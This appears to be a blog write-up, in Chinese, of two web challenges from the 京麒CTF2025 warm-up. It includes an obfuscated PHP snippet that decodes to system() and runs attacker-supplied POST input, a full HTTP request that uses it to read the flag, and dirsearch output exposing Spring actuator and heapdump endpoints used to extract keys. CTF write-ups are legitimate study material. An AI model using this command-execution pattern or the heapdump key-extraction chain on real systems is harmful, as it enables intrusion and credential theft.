+++
title = "京麒CTF2025热身赛"
slug = "jingqi-ctf-2025-warmup"
description = "。。。"
date = "2025-05-22T12:31:58"
lastmod = "2025-05-22T12:31:58"
image = ""
license = ""
categories = []
tags = []
+++

本来不想来看的，但是群里一直在复读，难道会很有意思？

## Execute

```php
<?php
$a = 'edoced_46esab';
$b = strrev($a);

$d = 'c3~@#@#@lz!@dGVt';
$s = $b($d);

echo $s;
$s($_POST[1]);
$e='php';
$f='in';
$w='fo';
$g=$e.$f.$w;
$g();
?>
```

```http
POST /execute.php HTTP/1.1
Host: 39.106.16.204:44099
Origin: http://39.106.16.204:44099
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Referer: http://39.106.16.204:44099/
Accept-Encoding: gzip, deflate
Content-Length: 216

code=%3C%3Fphp%0A%24a%20%3D%20'edoced_46esab'%3B%0A%24b%20%3D%20strrev(%24a)%3B%0A%0A%24d%20%3D%20'c3~%40%23%40%23%40lz!%40dGVt'%3B%0A%24s%20%3D%20%24b(%24d)%3B%0A%0Aecho%20%24s%3B%0A%24s(%24_POST%5B1%5D)%3B%0A%3F%3E&1=tac /f*
```

没压力啊，直接秒了

## EzLogin

没什么思路，扫描一下

```
└─$ dirsearch -u http://39.106.16.204:61457/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/桌面/reports/http_39.106.16.204_61457/__25-05-22_00-39-07.txt

Target: http://39.106.16.204:61457/

[00:39:07] Starting: 
[00:39:14] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[00:39:14] 404 -   96B  - /;/login                                          
[00:39:15] 400 -  435B  - /a%5c.aspx                                        
[00:39:15] 404 -  111B  - /actuator/;/auditevents                           
[00:39:15] 404 -  105B  - /actuator/;/beans
[00:39:15] 404 -  108B  - /actuator/;/auditLog
[00:39:15] 404 -  110B  - /actuator/;/conditions
[00:39:15] 200 -    2KB - /actuator
[00:39:15] 404 -  106B  - /actuator/;/caches
[00:39:15] 404 -  111B  - /actuator/;/configprops
[00:39:15] 404 -  121B  - /actuator/;/configurationMetadata
[00:39:15] 404 -  104B  - /actuator/;/dump
[00:39:15] 404 -  108B  - /actuator/;/features
[00:39:15] 404 -  106B  - /actuator/;/health
[00:39:15] 404 -  111B  - /actuator/;/healthcheck
[00:39:15] 404 -  124B  - /actuator/;/exportRegisteredServices
[00:39:15] 404 -  106B  - /actuator/;/flyway
[00:39:15] 404 -  103B  - /actuator/;/env
[00:39:15] 404 -  106B  - /actuator/;/events
[00:39:15] 404 -  108B  - /actuator/;/heapdump
[00:39:15] 404 -  109B  - /actuator/;/httptrace
[00:39:15] 404 -  104B  - /actuator/;/info
[00:39:15] 404 -  107B  - /actuator/;/jolokia
[00:39:15] 404 -  107B  - /actuator/;/logfile
[00:39:15] 404 -  116B  - /actuator/;/integrationgraph
[00:39:15] 404 -  109B  - /actuator/;/liquibase
[00:39:15] 404 -  108B  - /actuator/;/mappings
[00:39:15] 404 -  113B  - /actuator/;/loggingConfig
[00:39:15] 404 -  107B  - /actuator/;/refresh
[00:39:15] 404 -  117B  - /actuator/;/releaseAttributes
[00:39:15] 404 -  107B  - /actuator/;/loggers
[00:39:15] 404 -  107B  - /actuator/;/metrics
[00:39:15] 404 -  110B  - /actuator/;/prometheus
[00:39:15] 404 -  118B  - /actuator/;/registeredServices
[00:39:16] 404 -  113B  - /actuator/;/springWebflow
[00:39:16] 404 -  103B  - /actuator/;/sso
[00:39:16] 404 -  110B  - /actuator/;/statistics
[00:39:16] 404 -  102B  - /actuator/dump
[00:39:16] 404 -  108B  - /actuator/;/sessions
[00:39:16] 404 -  110B  - /actuator/;/threaddump
[00:39:16] 404 -  117B  - /actuator/;/resolveAttributes
[00:39:16] 404 -  114B  - /actuator/;/scheduledtasks
[00:39:16] 404 -  106B  - /actuator/;/status
[00:39:16] 404 -  108B  - /actuator/;/shutdown
[00:39:16] 404 -  119B  - /actuator/configurationMetadata
[00:39:16] 404 -  109B  - /actuator/auditevents
[00:39:16] 404 -  111B  - /actuator/;/ssoSessions
[00:39:16] 404 -  104B  - /actuator/events
[00:39:16] 404 -  106B  - /actuator/auditLog
[00:39:16] 404 -  122B  - /actuator/exportRegisteredServices
[00:39:16] 404 -  105B  - /actuator/;/trace
[00:39:16] 404 -  107B  - /actuator/httptrace
[00:39:16] 404 -  104B  - /actuator/flyway
[00:39:16] 404 -  114B  - /actuator/integrationgraph
[00:39:16] 404 -  112B  - /actuator/gateway/routes
[00:39:16] 404 -  109B  - /actuator/healthcheck
[00:39:16] 200 -   20B  - /actuator/caches
[00:39:16] 404 -  105B  - /actuator/jolokia
[00:39:16] 404 -  106B  - /actuator/features
[00:39:16] 404 -  105B  - /actuator/logfile
[00:39:16] 404 -  107B  - /actuator/liquibase
[00:39:16] 200 -    2B  - /actuator/info
[00:39:16] 404 -  115B  - /actuator/resolveAttributes
[00:39:16] 404 -  111B  - /actuator/loggingConfig
[00:39:16] 404 -  105B  - /actuator/refresh
[00:39:16] 404 -  106B  - /actuator/shutdown
[00:39:16] 404 -  106B  - /actuator/sessions
[00:39:16] 404 -  116B  - /actuator/registeredServices
[00:39:16] 404 -  108B  - /actuator/prometheus
[00:39:16] 404 -  115B  - /actuator/releaseAttributes
[00:39:16] 404 -  108B  - /actuator/management
[00:39:16] 404 -  111B  - /actuator/springWebflow
[00:39:16] 200 -    8KB - /actuator/env
[00:39:16] 404 -  104B  - /actuator/status
[00:39:16] 200 - 1018B  - /actuator/metrics
[00:39:16] 200 -   93KB - /actuator/beans
[00:39:16] 404 -  108B  - /actuator/statistics                              
[00:39:16] 404 -  103B  - /actuator/trace                                   
[00:39:16] 404 -  101B  - /actuator/sso                                     
[00:39:16] 404 -  109B  - /actuator/ssoSessions
[00:39:16] 404 -  112B  - /actuator/hystrix.stream
[00:39:16] 200 -   54B  - /actuator/scheduledtasks                          
[00:39:16] 200 -   49KB - /actuator/loggers                                 
[00:39:17] 200 -   22KB - /actuator/mappings                                
[00:39:17] 200 -  268B  - /actuator/health
[00:39:17] 200 -   99KB - /actuator/conditions                              
[00:39:17] 200 -  197KB - /actuator/threaddump                              
[00:39:17] 200 -   33MB - /actuator/heapdump                                
[00:39:18] 200 -   14KB - /actuator/configprops                             
[00:39:32] 404 -  102B  - /images/README                                    
[00:39:32] 404 -  103B  - /images/c99.php                                   
[00:39:32] 404 -  103B  - /images/Sym.php                                   
[00:39:35] 200 -   11KB - /login                                            
[00:39:35] 200 -   11KB - /login/ 
```

heapdump泄露，先把东西下载下来，随便找个工具来处理，不要strings当原始人 

https://github.com/wyzxxz/heapdump_tool

https://github.com/whwlsfb/JDumpSpider  但是第一个工具并没有成功

 ```
 java -jar heapdump_tools.jar C:\Users\baozhongqi\Desktop\heapdump2
 
 java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump2
 ```

拿到密钥之后用工具一把锁即可，如果不成功的多点点，随便乱按都能出，除非工具错了

